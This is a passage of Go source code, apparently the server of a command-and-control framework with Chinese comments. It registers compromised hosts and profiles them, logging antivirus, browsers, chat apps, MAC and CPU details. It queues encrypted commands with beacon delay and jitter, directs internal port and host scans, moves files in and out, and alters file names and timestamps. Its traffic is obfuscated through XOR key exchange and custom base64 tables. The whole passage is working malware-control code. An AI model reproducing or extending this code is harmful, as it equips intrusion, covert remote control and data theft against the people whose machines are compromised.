                        plugin := Plugin{
                            Remark:       requestData.Remark,
                            Code:       requestData.Code,
                            CodeWord: requestData.CodeWords,
                            os:         requestData.Os,
                            parameter:  parameterParts,
                            ParameterDesc: ParameterDesc,
                        }
                        //插入server_plugin
                        server_plugin.Plugins = append(server_plugin.Plugins, plugin)
                        // 插入成功后返回成功消息
                        logger.WriteLog(fmt.Sprintf(log_word["plugin_code"], requestData.Remark, requestData.Code))
                        fmt.Fprintf(w, "Plugin inserted successfully for %s", requestData.Remark)
                    case "startServer":
                        var requestData struct {
                            Port         string `json:"port"`
                            Path         string `json:"path"`
                            ConnPath     string `json:"connPath"`
                            MsgPath      string `json:"msgPath"`
                            SwitchKey    string `json:"switch_key"`
                            EncryKey     string `json:"encry_key"`
                            Download     string `json:"download"`
                            Result       string `json:"result"`
                            Net          string `json:"net"`
                            Info         string `json:"info"`
                            Upload       string `json:"upload"`
                            List         string `json:"list"`
                            Option       string `json:"option"`
                            Uid          string `json:"uid"`
                            Hostname     string `json:"hostname"`
                            KeyPart      string `json:"keyPart"`
                            Filekey      string `json:"filekey"`
                            Protocol     string `json:"protocol"`
                            User         string `json:"user"`
                            Remark       string `json:"remark"`
                            CertContent  string `json:"cert"`
                            KeyContent   string `json:"key"`
                            WindowsPro   string `json:"Group_pro"`
                            BaseRounds   string `json:"base_rounds"`
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        if requestData.Path == "" || requestData.Port == "" || requestData.Protocol == "" || requestData.Remark == "" {
                            http.Error(w, "parameter does not exist", http.StatusBadRequest)
                            return
                        }
                        for _, server := range server_data.Servers {
                            if requestData.Port == server.Port || requestData.Remark == server.Remark {
                                http.Error(w, "Port occupancy or remark already exists", http.StatusBadRequest)
                                return
                            }
                        }
                        paths := []string{
                            requestData.ConnPath,
                            requestData.MsgPath,
                            requestData.SwitchKey,
                            requestData.EncryKey,
                            requestData.Download,
                            requestData.Result,
                            requestData.Net,
                            requestData.Info,
                            requestData.Upload,
                            requestData.List,
                            requestData.Option,
                            requestData.Uid,
                            requestData.Hostname,
                            requestData.KeyPart,
                            requestData.Filekey,
                            requestData.User,
                        }
                        pathSet := make(map[string]bool)
                        // 检查路径是否重复和不为空
                        for _, p := range paths {
                            if pathSet[p] {
                                http.Error(w, "Path fields must not duplicate: "+p, http.StatusBadRequest)
                                return
                            }
                            if p != "" {
                                pathSet[p] = true
                            }
                        }
                        if requestData.BaseRounds != "" {
                            baseRounds := requestData.BaseRounds
                            // 判断 baseRounds 是否符合 base64表规则（长度64且无重复字符）
                            if len(baseRounds) != 64 {
                                http.Error(w, "Base64 table must be 64 characters", http.StatusBadRequest)
                                return
                            }
                            charSet := make(map[rune]bool)
                            for _, c := range baseRounds {
                                if charSet[c] {
                                    http.Error(w, "Base64 table contains duplicate characters", http.StatusBadRequest)
                                    return
                                }
                                charSet[c] = true
                            }
                            decodeMap := buildDecodeMap(baseRounds)
                            base_map[requestData.Port] = baseRounds
                            code_map[requestData.Port] = decodeMap
                        } else {
                            base_rounds := generateRandomBase64Table()
                            decodeMap := buildDecodeMap(base_rounds)
                            base_map[requestData.Port] = base_rounds
                            code_map[requestData.Port] = decodeMap
                            requestData.BaseRounds = base_rounds
                        }
                        if requestData.Protocol == "https" || requestData.Protocol == "http" {
                            handler := &MainHandler{}
                            serverManager := &MyServer{}
                            protocol.Http_server(handler, serverManager, logger, requestData.Port, requestData.Path,
                                requestData.ConnPath, requestData.MsgPath, requestData.SwitchKey, requestData.EncryKey,
                                requestData.Download, requestData.Result, requestData.Net, requestData.Info, requestData.Upload,
                                requestData.List, requestData.Option, requestData.Protocol, requestData.Uid, requestData.User,
                                requestData.Hostname, requestData.KeyPart, requestData.Filekey, requestData.Remark,
                                requestData.CertContent, requestData.KeyContent,requestData.WindowsPro,requestData.BaseRounds,log_word)
                        }
            }
		}
	}
}
//接收
func GetInfo(uid,encry_str,key,clientIP string,code_map map[byte]int){
    var server_remark string
    data := Get_decry_s(&encry_str, &key,&uid,code_map)
    data_list := strings.Split(data,"^")
    shellname := data_list[0]
    username := data_list[1]
    osname := data_list[2]
    t := data_list[3]
    innet_ip := data_list[4]
    currentDir := data_list[5]
    version := data_list[6]
    port := data_list[7]
    protocol := data_list[8]
    jitter := data_list[9]
    executable := data_list[10]
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    Remarks := "null"
    hash:=md5.New()
    hash.Write([]byte(key))
    hashBytes := hash.Sum(nil)
    hashString := hex.EncodeToString(hashBytes)
    timeInt,_:= strconv.Atoi(t)
    jitterInt,_:= strconv.Atoi(jitter)
    mutex.Lock()
    for i, server := range server_data.Servers {
        if port == server.Port && strings.HasPrefix(protocol,server.Protocol){
            server_data.Servers[i].Clients++
            server_remark = server_data.Servers[i].Remark
        }
    } 
    mutex.Unlock()
    put_client(username, shellname, osname, formattedTime, clientIP,currentDir,version,innet_ip,Remarks,uid,server_remark,executable,timeInt,jitterInt)
    log_str1 := fmt.Sprintf(log_word["agent_online"],
    username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:])
    logger.WriteLog(log_str1)
    DeleteEntry(uid)
}
func Windows_GetInfo(uid,encry_str,key,clientIP string,code_map map[byte]int){
    data := Get_decry_s(&encry_str, &key, &uid,code_map)
    data_list := strings.Split(data, "^")
    // 解析 Windows 专用的扩展字段
    shellname := data_list[0]
    username := data_list[1]
    osname := data_list[2]
    t := data_list[3]
    innet_ip := data_list[4]
    currentDir := data_list[5]
    version := data_list[6]
    port := data_list[7]
    protocol := data_list[8]
    jitter := data_list[9]
    executable := data_list[10]
    macs := data_list[11]           // MAC地址
    cpuInfo := data_list[12]        // CPU信息
    antivirus := data_list[13]      // 杀毒软件
    browsers := data_list[14]       // 浏览器信息
    chatApps := data_list[15]       // 聊天应用
    memoryStr := data_list[16]      // 内存使用情况
    systemType := data_list[17]     // 系统类型
    arch := data_list[18]           // 架构信息
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    // 计算 key hash
    hash := md5.New()
    hash.Write([]byte(key))
    hashBytes := hash.Sum(nil)
    hashString := hex.EncodeToString(hashBytes)
    timeInt, _ := strconv.Atoi(t)
    jitterInt, _ := strconv.Atoi(jitter)
    // 查找并更新服务器客户端数量
    var server_remark string
    mutex.Lock()
    for i, server := range server_data.Servers {
        if port == server.Port && strings.HasPrefix(protocol, server.Protocol) {
            server_data.Servers[i].Clients++
            server_remark = server_data.Servers[i].Remark
        }
    }
    mutex.Unlock()
    // 更新客户端信息，包含扩展字段
    Remarks := "null"
    Windows_put_client(username, shellname, osname, formattedTime, clientIP, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, timeInt, jitterInt, macs, cpuInfo, antivirus, browsers, chatApps, memoryStr, systemType, arch)
    // 记录详细的 Windows 信息日志
    log_str := fmt.Sprintf(log_word["windows_agent_online"],
        username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:], macs, cpuInfo, memoryStr, systemType, arch, antivirus, browsers, chatApps)
    logger.WriteLog(log_str)
    // 删除连接条目
    DeleteEntry(uid)
}
func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
     for i, client := range windows_client_data.Clients {
        if uid == client.Uid {
            int_delay, err := strconv.Atoi(delay)
            if err != nil {
                return "delay is not int"
            }
            int_jitter, err := strconv.Atoi(jitter)
            if err != nil {
                return "jitter is not int"
            }
            usernameModified := false
            remarksModified := false
            delayModified := false
            jitterModified := false
            if username != windows_client_data.Clients[i].Username {
                userExists := false
                for _, findUser := range windows_client_data.Clients {
                    if findUser.Username == username {
                        userExists = true
                        break
                    }
                }
                if userExists {
                    return "user already exists"
                }
                windows_client_data.Clients[i].Username = username
                usernameModified = true
            }
            if remarks != windows_client_data.Clients[i].Remarks {
                windows_client_data.Clients[i].Remarks = remarks
                remarksModified = true
            }
            if int_delay != windows_client_data.Clients[i].Delay {
                if int_delay < 1 {
                    int_delay = 1
                }
                windows_client_data.Clients[i].Delay = int_delay
                delayModified = true
                cmd := "GET_DELAY^"+delay
                Getcmd(uid,cmd,Taskid)
            }
            if int_jitter != windows_client_data.Clients[i].Jitter {
                if int_jitter <= 0 {
                    int_jitter = 5
                }
                windows_client_data.Clients[i].Jitter = int_jitter
                jitterModified = true
                cmd := "GET_JITTER^"+jitter
                Getcmd(uid,cmd,Taskid)
            }
            if !usernameModified && !remarksModified && !delayModified && !jitterModified {
                return "No changes needed"
            }
            return "confirm"
        }
    }
    return "nil"
}
func Change(uid, username, remarks, delay, jitter, Taskid string) string {
    for i, client := range client_data.Clients {
        if uid == client.Uid {
            int_delay, err := strconv.Atoi(delay)
            if err != nil {
                return "delay is not int"
            }
            int_jitter, err := strconv.Atoi(jitter)
            if err != nil {
                return "jitter is not int"
            }
            usernameModified := false
            remarksModified := false
            delayModified := false
            jitterModified := false
            if username != client_data.Clients[i].Username {
                userExists := false
                for _, findUser := range client_data.Clients {
                    if findUser.Username == username {
                        userExists = true
                        break
                    }
                }
                if userExists {
                    return "user already exists"
                }
                client_data.Clients[i].Username = username
                usernameModified = true
            }      
            if remarks != client_data.Clients[i].Remarks {
                client_data.Clients[i].Remarks = remarks
                remarksModified = true
            }
            if int_delay != client_data.Clients[i].Delay {
                if int_delay < 1 {
                    int_delay = 1
                }
                client_data.Clients[i].Delay = int_delay
                delayModified = true
                cmd := "GET_DELAY^"+delay
                Getcmd(uid,cmd,Taskid)
            }
            if int_jitter != client_data.Clients[i].Jitter {
                if int_jitter <= 0 {
                    int_jitter = 5
                }
                client_data.Clients[i].Jitter = int_jitter
                jitterModified = true
                cmd := "GET_JITTER^"+jitter
                Getcmd(uid,cmd,Taskid)
            }
            if !usernameModified && !remarksModified && !delayModified && !jitterModified {
                return "No changes needed"
            }
            return "confirm"
        }
    }
    return "nil"
}
func Confirm_chan(uid, username string) (Client, error) {
    for _, client := range client_data.Clients {
        if uid == client.Uid && username == client.Username {
            return client, nil
        }
    }
    return Client{}, fmt.Errorf("client not found")
}

func getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ip := forwarded
		if comma := strings.Index(forwarded, ","); comma > 0 {
			ip = forwarded[:comma]
		}
		return ip
	}
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}

func Listen(username string) string {
    var lastuid string
    var uid string
    var str string
    for i, client := range data_conn.Conns {
        if client.Username == username {
            uid = data_conn.Conns[i].Uid
        }
        if lastuid != uid {
            str += fmt.Sprintf("<div class='ip-container' id='container-%s'>", client.Host)
            str += fmt.Sprintf("<p class='ip-address' id='%s'>[Uid:%s]</p>", client.Uid, html.EscapeString(client.Uid))
            str += fmt.Sprintf("<p class='shell-address' id='%s'>[Host:%s]</p>", client.Host, html.EscapeString(client.Host))
            str += fmt.Sprintf("<p class='online-time'>[online time:%s]</p>", html.EscapeString(client.OnlineTime))
            str += fmt.Sprintf("<p class='shell-address'>[IP:%s]</p>", html.EscapeString(client.ShellIP))
            str += fmt.Sprintf("<button class='let-it-in-button' id='button_%s' onclick=\"get_conn('%s','%s')\">receive</button>", client.Host, client.Uid, client.Host)
            str += fmt.Sprintf("<button class='let-it-in-button' onclick=\"del_conn('%s')\">remove</button>", client.Uid)
            str += "</div>"
            lastuid = uid
        }
    }
    return str
}

func Get_conn(uid,username, hostname,clientIP string) string {
	current := time.Now()
	formattedTime := current.Format("2006.01.02 15:04")
	mutex.Lock()
	defer mutex.Unlock()
	// 循环查询并更新链接结构体
	for i, conn := range data_conn.Conns {
		if username == conn.Username && hostname == conn.Host && uid == conn.Uid {
			data_conn.Conns[i].OnlineTime = formattedTime
            delete(key_map, uid)
            key2_map[uid] = nil
			key1_map[uid] = nil
			for {
				check_key := insert_key1_map(uid)
				if check_key == false {
					time.Sleep(1 * time.Second)
				} else {
					break
				}
			}
			//返回约定公钥,与服务器中间值
			keyStr := fmt.Sprintf("%v-%v-%v-%v-%v-%v-%v-%v-%v-%v-%v-%v",
            key1_map[uid][0], key1_map[uid][1], key1_map[uid][2], key1_map[uid][3],key1_map[uid][4], key1_map[uid][5],
            key1_map[uid][12],key1_map[uid][13], key1_map[uid][14], key1_map[uid][15], key1_map[uid][16],key1_map[uid][17])
			return keyStr
		}
	}
	// 如果未找到，则插入新链接结构体
	put_conn(username, hostname, formattedTime,uid, clientIP, "null")
    delete(key_map, uid)
    key2_map[uid] = nil
	key1_map[uid] = nil
	for {
        check_key := insert_key1_map(uid)
        if check_key == false {
            time.Sleep(1 * time.Second)
        }else{
            break
        }
    }
	//返回约定公钥,与服务器中间值
	keyStr := fmt.Sprintf("%v-%v-%v-%v-%v-%v-%v-%v-%v-%v-%v-%v",
    key1_map[uid][0], key1_map[uid][1], key1_map[uid][2], key1_map[uid][3],key1_map[uid][4], key1_map[uid][5],
    key1_map[uid][12],key1_map[uid][13], key1_map[uid][14], key1_map[uid][15], key1_map[uid][16],key1_map[uid][17])
    return keyStr
}

// 获取密钥
func insert_key1_map(uid string) bool {
    key1_map[uid] = []int{
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
    }
    for _, key := range key1_map[uid] {
        if key <= 0 || key > 50 {
            return false
        }
    }
    intermediate := []int{
        key1_map[uid][0] ^ key1_map[uid][6],
        key1_map[uid][1] ^ key1_map[uid][7],
        key1_map[uid][2] ^ key1_map[uid][8],
        key1_map[uid][3] ^ key1_map[uid][9],
        key1_map[uid][4] ^ key1_map[uid][10],
        key1_map[uid][5] ^ key1_map[uid][11],
    }
    // 建议统一校验范围
    for i := 0; i < len(intermediate); i++ {
        if intermediate[i] <= 0 || intermediate[i] > 50 {
            return false
        }
    }
    key1_map[uid] = append(key1_map[uid], intermediate...)
    return true
}

//接收客户端中间值添加与服务器私钥交互计算出最终密钥再与data_conn.Conns[i].HostKey交互返回给客户端
func Switch_key(uid,key_part string)error{
	for _, conn := range data_conn.Conns {
		if uid == conn.Uid{
			serverPrivateKey := key1_map[uid][6:12]
			conn_parts := strings.Split(key_part, "-")
			clientIntermediate := make([]int, 6)
			for i, part := range conn_parts {
				var err error
				clientIntermediate[i], err = strconv.Atoi(part)
				if err != nil {
					return err
				}
			}
			serverFinalcKey := []int{
				clientIntermediate[0] ^ serverPrivateKey[0],
				clientIntermediate[1] ^ serverPrivateKey[1],
				clientIntermediate[2] ^ serverPrivateKey[2],
                clientIntermediate[3] ^ serverPrivateKey[3],
                clientIntermediate[4] ^ serverPrivateKey[4],
                clientIntermediate[5] ^ serverPrivateKey[5],
			}
			key2_map[uid] = append(key2_map[uid],serverFinalcKey...)
            return nil
		}
	}
    return nil
}

func EncryptHostKey(uid, key string) {
	pavi_key, exists1 := key2_map[uid]
	client_key := []byte(key)
	if exists1 {
		segmentSize := len(client_key) / 6
		for i := 0; i < 6; i++ {
			start := i * segmentSize
			end := start + segmentSize
			if i == 5 {
				end = len(client_key)
			}
			for j := start; j < end; j++ {
				if client_key[j] < byte(pavi_key[i]) {
					client_key[j] = client_key[j] ^ byte(pavi_key[i])
				}
			}
		}
		// 保存加密后的 key
		key_map[uid] = string(client_key)
		if len(client_key) > 1024 {
			keyPartArr[uid] = append(keyPartArr[uid],
				6, 17,int(math.Abs(float64(client_key[24] - 1))),
				int(client_key[13]),
				int(client_key[74])+24,45, 78,
				int(client_key[45])+int(client_key[67]),
				int(client_key[79])+int(client_key[89])+int(client_key[106]),128,
				int(client_key[85])+int(client_key[94])+int(client_key[189])+int(client_key[216]),
				256, 384,512+int(client_key[196]),
				int(client_key[43])+int(client_key[443])+640,
				768+int(client_key[569]),len(client_key)-25,
				int(math.Abs(math.Sin(float64(client_key[445]))*128))*12,
				int(math.Log(float64(client_key[530])+1)*255)*24,
				int(math.Pow(float64(client_key[660]), 1)*48),
				int(math.Sqrt(float64(client_key[970])))*64,
				(len(client_key)+int(client_key[1024]))*128,
			)
		}
	}
}

//插入密钥
func Insert_key(uid, username, shellname string) {
    charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    rand.Seed(time.Now().UnixNano())
    keyLength := rand.Intn(255) + 1024
    keyBuilder := strings.Builder{}
    // 生成密钥
    for i := 0; i < keyLength; i++ {
        randomIndex := rand.Intn(len(charset))
        keyBuilder.WriteByte(charset[randomIndex])
    }
    // 拼接完成的密钥
    key := keyBuilder.String()
    // 查找并更新对应的连接
    for i, conn := range data_conn.Conns {
        if uid == conn.Uid && username == conn.Username && shellname == conn.Host {
            data_conn.Conns[i].HostKey = key
            break
        }
    }
}

func DeleteEntry(delshell string) {
	if delshell != "" {
		mutex.Lock()
		defer mutex.Unlock()
		for i,conn := range data_conn.Conns{
			if delshell == conn.Uid{
				data_conn.Conns = append(data_conn.Conns[:i], data_conn.Conns[i+1:]...)
				break
			}
		}
	}
}
//写入目录列表
func Put_file_list(uid,file,taskid string,code_rounds map[byte]int) {
    var dir,list string
    key, exists := key_map[uid]
    if !exists {
        return
    }
    mutex.Lock()
    //解密
    decryptedData := Get_decry_s(&file, &key, &uid,code_rounds)
    //用^分割decryptedData,提取出第一个值
    parts := strings.SplitN(decryptedData, "^", 2)
    if len(parts) >= 2 {
        list = parts[0]
        //分割一次后面再合并
        dir = strings.Join(parts[1:], "^")
    }else{
        dir = decryptedData
    }
    msg_file_list = append(msg_file_list, Msg_file{
        Uid:  uid,
        Taskid: taskid,
        File: dir,
    })
    mutex.Unlock()
    go save_file_list(uid, dir, list)
}

//读取文件列表
func Get_file_list(uid, taskid string) string {
    mutex.Lock()
    defer mutex.Unlock()
    // 找到符合 uid 和 taskid 的索引和 file
    var file string
    var foundIndex int = -1
    for i, item := range msg_file_list {
        if item.Uid == uid && item.Taskid == taskid {
            file = item.File
            foundIndex = i
            break
        }
    }
    if foundIndex == -1 {
        return ""
    }
    // 删除找到的条目
    msg_file_list = append(msg_file_list[:foundIndex], msg_file_list[foundIndex+1:]...)
    return file
}
//按索引删除客户端目录缓存
func Del_file_list(uid, indexStr string) {
    mutex.Lock()
    defer mutex.Unlock()
    index, err := strconv.Atoi(indexStr)
    if err != nil {
        return
    }
    // 找到 uid 对应的所有文件的索引
    var uidIndices []int
    for i, item := range msg_file_cache {
        if item.Uid == uid {
            uidIndices = append(uidIndices, i)
        }
    }
    if index < 0 || index >= len(uidIndices) {
        return
    }
    // 删除对应索引的文件
    delIdx := uidIndices[index]
    msg_file_cache = append(msg_file_cache[:delIdx], msg_file_cache[delIdx+1:]...)
}
//读取目录缓存给客户端
type file_json struct {
    List string `json:"list"`
    File string `json:"file"`
}
func Read_file_list(uid string) []file_json{
    mutex.Lock()
    defer mutex.Unlock()
    // 只收集匹配的文件，不删除
    var fileList []file_json
    for _, item := range msg_file_cache {
        if item.Uid == uid {
            file_json := file_json{
                List: item.Taskid,
                File: item.File,
            }
            fileList = append(fileList, file_json)
        }
    }
    return fileList
}
//缓存客户端目录
func save_file_list(uid, file, list string) {
    mutex.Lock()
    defer mutex.Unlock()
    for i, item := range msg_file_cache {
        if item.Uid == uid && item.Taskid == list {
            msg_file_cache[i].File = file
            return
        }
    }
    // 不存在则追加
    msg_file_cache = append(msg_file_cache, Msg_file{
        Uid:  uid,
        Taskid: list,
        File: file,
    })
}

//缓存客户端消息
func SaveMsg(uid,msg,Taskid string) {
    mutex.Lock()
    defer mutex.Unlock()
    msg_map_list = append(msg_map_list, Msg_result{
        Uid:    uid,
        Result: msg,
        Taskid: Taskid,
    })
}
//msg_get插队
// 插队 msg_get 中 uid 对应的消息
func ChangeMsh(uid, s_id, pos string) {
    mutex.Lock()
    defer mutex.Unlock()
    // 提取该 uid 的所有任务及其原索引
    var indices []int
    for i, item := range msg_get_list {
        if item.Uid == uid {
            indices = append(indices, i)
        }
    }
    if len(indices) == 0 {
        return
    }
    s_id_int, err1 := strconv.Atoi(s_id)
    pos_int, err2 := strconv.Atoi(pos)
    if err1 != nil || err2 != nil || s_id_int < 0 || s_id_int >= len(indices) || pos_int < 0 || pos_int > len(indices) {
        return
    }
    // 取出要移动的元素的全局索引
    fromIdx := indices[s_id_int]
    item := msg_get_list[fromIdx]
    // 删除该元素
    msg_get_list = append(msg_get_list[:fromIdx], msg_get_list[fromIdx+1:]...)
    // 由于删除了一个元素，后续位置索引需要调整
    // 重新找 uid 的所有元素索引（除已移除的）
    indices = nil
    for i, item := range msg_get_list {
        if item.Uid == uid {
            indices = append(indices, i)
        }
    }
    // 计算插入位置（全局索引）
    var insertIdx int
    if pos_int >= len(indices) {
        // 插入到最后一个同 uid 项之后
        insertIdx = len(msg_get_list)
    } else {
        insertIdx = indices[pos_int]
    }
    // 插入元素
    msg_get_list = append(msg_get_list[:insertIdx],
        append([]Msg_get{item}, msg_get_list[insertIdx:]...)...)
}


//将msg_map输出
func GetMsgList(uid string) []string {
    mutex.Lock()
    defer mutex.Unlock()
    var result []string
    for _, item := range msg_get_list {
        if item.Uid == uid {
            entry := fmt.Sprintf("%s:\t%s", item.Taskid, item.Ori_Msg)
            result = append(result, entry)
        }
    }
    return result
}

// 获取结果
func Getresults(uid, taskid string) string {
    mutex.Lock()
    defer mutex.Unlock()
    for i, res := range msg_result_list {
        if res.Uid == uid && res.Taskid == taskid {
            result := res.Result
            msg_result_list = append(msg_result_list[:i], msg_result_list[i+1:]...)
            return result
        }
    }
    return ""
}

// 写入结果
func Results(uid, results, Taskid string,code_map map[byte]int) {
    mutex.Lock()
    defer mutex.Unlock()
    key, exists := key_map[uid]
    if !exists {
        return
    }
    decry_results := Get_decry_s(&results, &key, &uid,code_map)
    go SaveMsg(uid, decry_results, Taskid)
    // 如果是 CHANG_FILE_TIME 或 CHANG_FILE_NAME，写日志
    if strings.HasPrefix(decry_results, "CHANG_FILE_TIME^") {
        newParts := strings.Split(decry_results, "^")
        if len(newParts) > 1 && newParts[1] != "" {
            newTime := newParts[1]
            log_str := fmt.Sprintf(log_word["change_file_time"], uid, newTime)
            logger.WriteLog(log_str)
        }
    } else if strings.HasPrefix(decry_results, "CHANG_FILE_NAME^") {
        newParts := strings.Split(decry_results, "^")
        if len(newParts) > 1 && newParts[1] != "" {
            newName := newParts[1]
            log_str := fmt.Sprintf(log_word["change_file_name"], uid, newName)
            logger.WriteLog(log_str)
        }
    }

    // 写入结果列表
    msg_result_list = append(msg_result_list, Msg_result{
        Uid:    uid,
        Result: decry_results,
        Taskid: Taskid,
    })

    // 日志记录
    var shellname string
    for _, client := range client_data.Clients {
        if uid == client.Uid {
            shellname = client.Host
            break
        }
    }
    log_str := fmt.Sprintf(log_word["result"], shellname, uid, len(results))
    logger.WriteLog(log_str)
}

// 获取指令
func GetMsg(uid,base_rounds string) string {
    mutex.Lock()
    defer mutex.Unlock()
    // 更新时间
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04:05")
    go func(uid string) {
        for i, client := range client_data.Clients {
            if uid == client.Uid {
                client_data.Clients[i].checkTime = formattedTime
                break
            }
        }
        for j, client := range windows_client_data.Clients {
            if uid == client.Uid {
                windows_client_data.Clients[j].CheckTime = formattedTime
                break
            }
        }
    }(uid)
    _, hasKey := key_map[uid]
    if !hasKey {
        base_uid := customBase64Encode([]byte(uid),base_rounds)
        return base_uid // 未注册客户端
    }
    // 遍历 msg_get_list 查找第一个匹配的 uid
    for i, msg := range msg_get_list {
        if msg.Uid == uid {
            // 找到了对应的指令，出队
            encryMsg := msg.Encry_Msg
            // 从切片中移除该项
            msg_get_list = append(msg_get_list[:i], msg_get_list[i+1:]...)
            return encryMsg
        }
    }
    return "" // 有 key 但无任务
}

//写入指令
func Getcmd(uid, cmd, Taskid string) string {
    var base_rounds string
    if uid != ""{
        base_rounds = uid_base[uid]
        if base_rounds == "" {
            return "missing parameter"
        }
    }
	if cmd != "" && !strings.HasPrefix(cmd, "SWITCH_VERSION^") && !strings.HasPrefix(cmd, "GET_PORTS^") &&
     !strings.HasPrefix(cmd, "GET_U_FRIENDS^") && !strings.HasPrefix(cmd, "LOAD_U_FILE^") && !strings.HasPrefix(cmd, "GET_U_FILE^") {
		mutex.Lock()
		key, exists := key_map[uid]
		if exists {
            n_cmd := cmd + "^" + Taskid
			encryptedCmd := Get_encry_s(&n_cmd, &key, &uid,&base_rounds)
			new_msg := Msg_get{
				Ori_Msg:   cmd,
				Encry_Msg: encryptedCmd,
				Uid:       uid,
				Taskid:    Taskid,
			}
			msg_get_list = append(msg_get_list, new_msg)
		}
		mutex.Unlock()
		if !strings.HasPrefix(cmd, "CHANG_FILE_NAME^") && !strings.HasPrefix(cmd, "CHANG_FILE_TIME^") &&
			!strings.HasPrefix(cmd, "GET_DELAY^") && !strings.HasPrefix(cmd, "LOOK_UP_FILE^") &&
			!strings.HasPrefix(cmd, "GET_JITTER^") {
			go func(uid string) {
				for _, client := range client_data.Clients {
					if uid == client.Uid {
						log_str := fmt.Sprintf(log_word["msg"], client.Host, uid, cmd)
						logger.WriteLog(log_str)
					}
				}
			}(uid)
		}
	} else if strings.HasPrefix(cmd, "SWITCH_VERSION^") {
        cmd_split := strings.Split(cmd, "^")
        if len(cmd_split) != 2 {
            return "missing parameter"
		}
		version := cmd_split[1]
		mutex.Lock()
		for i, client := range client_data.Clients {
			if uid == client.Uid {
				client_data.Clients[i].version = version
				key, exists := key_map[uid]
				if exists {
					n_cmd := cmd + "^" + Taskid
					encryptedCmd := Get_encry_s(&n_cmd, &key, &uid,&base_rounds)
					new_msg := Msg_get{
						Ori_Msg:   cmd,
						Encry_Msg: encryptedCmd,
						Uid:       uid,
						Taskid:    Taskid,
					}
					msg_get_list = append(msg_get_list, new_msg)
				}
			}
		}
		mutex.Unlock()
	} else if strings.HasPrefix(cmd, "GET_PORTS^") || strings.HasPrefix(cmd, "GET_U_FRIENDS^") {
		parts := strings.Split(cmd, "^")
		if len(parts) == 5 {
			sleep_time, err := strconv.Atoi(parts[3])
			if err != nil {
				return "delay is not int"
			}
			if sleep_time < 1 {
				sleep_time = 1
			}
			if parts[4] == "" {
				parts[4] = "whatever"
			}
			if strings.HasPrefix(cmd, "GET_U_FRIENDS^") {
				ip_split := strings.Split(parts[1], ".")
				if !Check_comment(ip_split[3], "ping") {
					return "Format error"
				}
			}
			if !Check_comment(parts[2], "port") {
				return "Format error"
			}
			newCmd := fmt.Sprintf("%s^%s^%s^%d^%s", parts[0], parts[1], parts[2], sleep_time, parts[4])
			key, exists := key_map[uid]
			if exists {
				n_cmd := newCmd + "^" + Taskid
                mutex.Lock()
                encryptedCmd := Get_encry_s(&n_cmd, &key, &uid,&base_rounds)
                new_msg := Msg_get{
                    Ori_Msg:   cmd,
                    Encry_Msg: encryptedCmd,
                    Uid:       uid,
                    Taskid:    Taskid,
                }
                msg_get_list = append(msg_get_list, new_msg)
				mutex.Unlock()
				log_str := fmt.Sprintf(log_word["scan_msg"], uid, parts[1])
				logger.WriteLog(log_str)
			}
		} else {
			return "missing parameter"
		}
	} else if strings.HasPrefix(cmd, "GET_U_FILE^") || strings.HasPrefix(cmd, "LOAD_U_FILE^") {
		var newCmd string
		parts := strings.Split(cmd, "^")

		if strings.HasPrefix(cmd, "GET_U_FILE^") {
			if len(parts) != 3 {
				return "missing parameter"
			}
			splitSizeStr := parts[2]
			if dot := strings.Index(splitSizeStr, "."); dot != -1 {
				splitSizeStr = splitSizeStr[:dot]
			}
			splitSize, err := strconv.Atoi(splitSizeStr)
			if err != nil || splitSize <= 0 {
				parts[2] = "1048576"
			} else {
				parts[2] = strconv.Itoa(splitSize)
			}
			newCmd = strings.Join(parts, "^")
		}

		if strings.HasPrefix(cmd, "LOAD_U_FILE^") {
			if len(parts) != 2 {
				return "missing parameter"
			}
			str_parts := strings.Split(parts[1], "*")
			splitSizeStr := strings.TrimSpace(str_parts[len(str_parts)-1])
			if dot := strings.Index(splitSizeStr, "."); dot != -1 {
				splitSizeStr = splitSizeStr[:dot]
			}
			splitSize, err := strconv.Atoi(splitSizeStr)
			if err != nil || splitSize <= 0 {
				str_parts[len(str_parts)-1] = "1048576"
			} else {
				str_parts[len(str_parts)-1] = strconv.Itoa(splitSize)
			}
			newCmd = "LOAD_U_FILE^" + strings.Join(str_parts, "*")
		}

		key, exists := key_map[uid]
		if exists {
			n_cmd := newCmd + "^" + Taskid
            mutex.Lock()
            encryptedCmd := Get_encry_s(&n_cmd, &key, &uid,&base_rounds)
            new_msg := Msg_get{
                Ori_Msg:   cmd,
                Encry_Msg: encryptedCmd,
                Uid:       uid,
                Taskid:    Taskid,
            }
            msg_get_list = append(msg_get_list, new_msg)
			mutex.Unlock()
		}
	} else {
		return "missing parameter"
	}
	return ""
}

//获取内网资产
func Net_getresults(uid string) (string, error) {
    if uid == "" {
        return "", fmt.Errorf("uid is empty")
    }
    mutex.Lock()
    shell_results, exists := shell_net_post[uid]
    if exists {
        delete(shell_net_post, uid)
        mutex.Unlock()
        // 存入内网资产端口结构体...
        in_port(uid, shell_results)
        return shell_results, nil
    }
    mutex.Unlock()
    return "", fmt.Errorf("data not found for uid: %s", uid)
}

//写入内网资产
func Net_results(uid,results string,code_rounds map[byte]int) {
    mutex.Lock()
    key, exists := key_map[uid]
    mutex.Unlock()
    if exists {
        encryptedData := Get_decry_s(&results, &key,&uid,code_rounds)
